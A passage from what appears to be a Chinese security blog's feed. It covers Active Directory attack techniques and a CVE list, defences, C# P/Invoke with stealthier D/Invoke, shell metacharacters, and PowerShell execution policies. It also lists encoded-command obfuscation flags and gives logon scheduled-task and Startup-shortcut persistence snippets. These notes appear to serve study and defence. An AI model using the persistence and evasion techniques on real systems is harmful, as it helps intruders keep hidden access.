&lt;p&gt;该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了  &lt;code&gt;DONT_REQ_PREAUTH&lt;/code&gt;  。&lt;/p&gt;
&lt;h3 id=&#34;kerberos-delegation-attacks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kerberos-delegation-attacks&#34;&gt;#&lt;/a&gt; Kerberos Delegation Attacks&lt;/h3&gt;
&lt;p&gt;在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。&lt;/p&gt;
&lt;p&gt;Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。&lt;/p&gt;
&lt;h3 id=&#34;其他漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他漏洞利用&#34;&gt;#&lt;/a&gt; 其他漏洞利用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;域用户提权 (CVE-2022-26923)&lt;/li&gt;
&lt;li&gt;KDC bamboozling (CVE-2021-42287)&lt;/li&gt;
&lt;li&gt;Name impersonation (CVE-2021-42278)&lt;/li&gt;
&lt;li&gt;ProxyShell (CVE-2021-34473)&lt;/li&gt;
&lt;li&gt;ProxyLogon (CVE-2021-26855)&lt;/li&gt;
&lt;li&gt;PrintNightmare (CVE-2021-1675 / CVE-2021-34527)&lt;/li&gt;
&lt;li&gt;SMBGhost (CVE-2020-0796)&lt;/li&gt;
&lt;li&gt;Zerologon (CVE-2020-1472)&lt;/li&gt;
&lt;li&gt;NTLM Relay (CVE-2019-1040)&lt;/li&gt;
&lt;li&gt;永恒之蓝 (MS17-010)&lt;/li&gt;
&lt;li&gt;域用户提权 (MS14-068)&lt;/li&gt;
&lt;li&gt;Gpp 漏洞 (MS14-025)&lt;/li&gt;
&lt;li&gt;SAMR 协议漏洞 (MS14-016)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防护&#34;&gt;#&lt;/a&gt; 防护&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;使用 ATA 等商业化防护工具&lt;/li&gt;
&lt;li&gt;安装杀毒软件、EDR 等工具&lt;/li&gt;
&lt;li&gt;关闭高危服务&lt;/li&gt;
&lt;li&gt;统一配置防火墙策略&lt;/li&gt;
&lt;li&gt;对域控等高危账号使用白名单进行行为管理&lt;/li&gt;
&lt;li&gt;检测高危操作
&lt;ul&gt;
&lt;li&gt;权限提升&lt;/li&gt;
&lt;li&gt;高危账号密码修改、重置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;行为频率建模
&lt;ul&gt;
&lt;li&gt;对大量尝试登录 / 信息查询进行报警&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;及时安装补丁&lt;/li&gt;
&lt;li&gt;对特定攻击行为进行监控
&lt;ul&gt;
&lt;li&gt;通过 GPO 下发自启动、计划任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/CSharp/</guid>
            <title>C#</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/CSharp/</link>
            <category>CSharp</category>
            <pubDate>Mon, 28 Nov 2022 10:51:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;利用技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用技巧&#34;&gt;#&lt;/a&gt; 利用技巧&lt;/h1&gt;
&lt;h2 id=&#34;pinvoke&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pinvoke&#34;&gt;#&lt;/a&gt; P/Invoke&lt;/h2&gt;
&lt;p&gt;Platform Invoke (P/Invoke) 提供了 C# 访问 DLL 中数据结构、回调、函数的能力。基本的使用方式如官方 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L3N0YW5kYXJkL25hdGl2ZS1pbnRlcm9wL3BpbnZva2U=&#34;&gt;Platform Invoke&lt;/span&gt; 文档中所示。利用 P/Invoke 的能力，C# 程序可以较为容易的调用标准的 Windows API。&lt;/p&gt;
&lt;figure class=&#34;highlight cs&#34;&gt;&lt;figcaption data-lang=&#34;C#&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;token namespace&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;token namespace&#34;&gt;System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Runtime&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;InteropServices&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Program&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// Import user32.dll (containing the function we need) and define&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// the method corresponding to the native function.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token attribute&#34;&gt;&lt;span class=&#34;token class-name&#34;&gt;DllImport&lt;/span&gt;&lt;span class=&#34;token attribute-arguments&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;user32.dll&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; CharSet &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; CharSet&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Unicode&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; SetLastError &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extern&lt;/span&gt; &lt;span class=&#34;token return-type class-name&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;MessageBox&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;IntPtr&lt;/span&gt; hWnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;string&lt;/span&gt;&lt;/span&gt; lpText&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;string&lt;/span&gt;&lt;/span&gt; lpCaption&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;uint&lt;/span&gt;&lt;/span&gt; uType&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token return-type class-name&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/span&gt; args&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// Invoke the function as a regular managed method.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;MessageBox&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;IntPtr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Zero&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Command-line message box&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Attention!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;P/Invoke 的缺点在于引用了的 API 调用会最后出现在可执行文件的 IAT 中，使得一些敏感的行为容易被防护软件所注意。同时一些敏感的 API 可能是被防护软件所监控的，通过这种方式进行的 API 调用也容易被防护软件拦截。&lt;/p&gt;
&lt;h2 id=&#34;dinvoke&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dinvoke&#34;&gt;#&lt;/a&gt; D/Invoke&lt;/h2&gt;
&lt;p&gt;在 P/Invoke 的基础上，有研究人员提出了基于 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L2NzaGFycC9wcm9ncmFtbWluZy1ndWlkZS9kZWxlZ2F0ZXMv&#34;&gt;Delegates&lt;/span&gt; 机制的 D/Invoke，通过更隐蔽的方式来调用所需的 API。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;net&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#net&#34;&gt;#&lt;/a&gt; .Net&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L2Z1bmRhbWVudGFscy8=&#34;&gt;.NET documentation&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用技巧-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用技巧-2&#34;&gt;#&lt;/a&gt; 利用技巧&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90aGV3b3Zlci5naXRodWIuaW8vRHluYW1pYy1JbnZva2Uv&#34;&gt;Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp;amp; API Hooks)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/</guid>
            <title>Shell</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/</link>
            <category>Linux</category>
            <category>Shell</category>
            <pubDate>Mon, 28 Nov 2022 10:48:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。&lt;/p&gt;
&lt;p&gt;Linux 包含多种 Shell ，常见的有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bourne Shell（ATT 的 Bourne 开发，名为 sh）&lt;/li&gt;
&lt;li&gt;Bourne Again Shell（/bin/bash）&lt;/li&gt;
&lt;li&gt;C Shell（Bill Joy 开发，名为 csh）&lt;/li&gt;
&lt;li&gt;K Shell（ATT 的 David G.koun 开发，名为 ksh）&lt;/li&gt;
&lt;li&gt;Z Shell（Paul Falstad 开发，名为 zsh）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;元字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元字符&#34;&gt;#&lt;/a&gt; 元字符&lt;/h1&gt;
&lt;p&gt;shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。&lt;/p&gt;
&lt;p&gt;常见的元字符如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IFS&lt;/code&gt;  由 &amp;lt;space&amp;gt; 或 &amp;lt;tab&amp;gt; 或 &amp;lt;enter&amp;gt; 三者之一组成&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CR&lt;/code&gt;  由 &amp;lt;enter&amp;gt; 产生。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt;  设定变量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt;  作变量或运算替换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;  重定向 stdout&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;  追加到文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  重定向 stdin&lt;/li&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;  命令管道&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  后台执行命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;  在前一个命令结束后，执行下一个命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;  在前一个命令未报错执行后，执行下一个命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;  在前一个命令执行报错后，执行下一个命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  在单引号内的命令会保留原来的值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;  在双引号内的命令会允许变量替换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`&lt;/code&gt;  在反引号内的内容会当成命令执行并替换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;()&lt;/code&gt;  在子 Shell 中执行命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt;  在当前 Shell 中执行命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&lt;/code&gt;  当前用户的主目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!number&lt;/code&gt;  执行历史命令，如  &lt;code&gt;!1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h1&gt;
&lt;p&gt;除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。&lt;/p&gt;
&lt;p&gt;常见的通配符如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  匹配 0 或多个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  匹配任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[list]&lt;/code&gt;  匹配 list 中的任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[!list]&lt;/code&gt;  匹配除 list 外的任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[a-c]&lt;/code&gt;  匹配 a-c 中的任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;string1,string2,...&amp;#125;&lt;/code&gt;  分别匹配其中字符串&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PowerShell/</guid>
            <title>PowerShell</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PowerShell/</link>
            <category>PowerShell</category>
            <pubDate>Mon, 28 Nov 2022 10:40:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;执行策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行策略&#34;&gt;#&lt;/a&gt; 执行策略&lt;/h1&gt;
&lt;p&gt;PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略。&lt;/p&gt;
&lt;p&gt;Restricted 策略可以执行单个的命令，但是不能执行脚本，Windows 8、 Windows Server 2012 中默认使用该策略。&lt;/p&gt;
&lt;p&gt;AllSigned 策略允许执行所有具有数字签名的脚本。&lt;/p&gt;
&lt;p&gt;RemoteSigned 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。&lt;/p&gt;
&lt;p&gt;Unrestricted 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。&lt;/p&gt;
&lt;p&gt;BypassBypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。&lt;/p&gt;
&lt;p&gt;UndefinedUndefined 表示没有设置脚本策略，会继承或使用默认的脚本策略。&lt;/p&gt;
&lt;h1 id=&#34;混淆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#混淆&#34;&gt;#&lt;/a&gt; 混淆&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-EC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-EncodedCommand&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-EncodedComman&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-EncodedComma&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-EncodedComm&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见功能&#34;&gt;#&lt;/a&gt; 常见功能&lt;/h1&gt;
&lt;h2 id=&#34;计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计划任务&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h2&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Action&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-ScheduledTaskAction&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Execute &lt;span class=&#34;token string&#34;&gt;&#34;calc.exe&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Trigger&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-ScheduledTaskTrigger&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AtLogon&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$User&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-ScheduledTaskPrincipal&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;GroupId &lt;span class=&#34;token string&#34;&gt;&#34;BUILTIN\Administrators&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;RunLevel Highest&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Set&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-ScheduledTaskSettingsSet&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$object&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-ScheduledTask&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Action &lt;span class=&#34;token variable&#34;&gt;$Action&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Principal &lt;span class=&#34;token variable&#34;&gt;$User&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Trigger &lt;span class=&#34;token variable&#34;&gt;$Trigger&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Settings &lt;span class=&#34;token variable&#34;&gt;$Set&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Register-ScheduledTask&lt;/span&gt; AtomicTask &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;InputObject &lt;span class=&#34;token variable&#34;&gt;$object&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Unregister-ScheduledTask&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;TaskName &lt;span class=&#34;token string&#34;&gt;&#34;AtomicTask&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;confirm:&lt;span class=&#34;token boolean&#34;&gt;$false&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;创建链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建链接&#34;&gt;#&lt;/a&gt; 创建链接&lt;/h2&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Shell&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ComObject &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WScript.Shell&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ShortCut&lt;/span&gt; = &lt;span class=&#34;token variable&#34;&gt;$Shell&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;CreateShortcut&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token variable&#34;&gt;$env&lt;/span&gt;:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\test.lnk&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ShortCut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TargetPath=&lt;span class=&#34;token string&#34;&gt;&#34;cmd.exe&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ShortCut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;WorkingDirectory = &lt;span class=&#34;token string&#34;&gt;&#34;C:\Windows\System32&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span 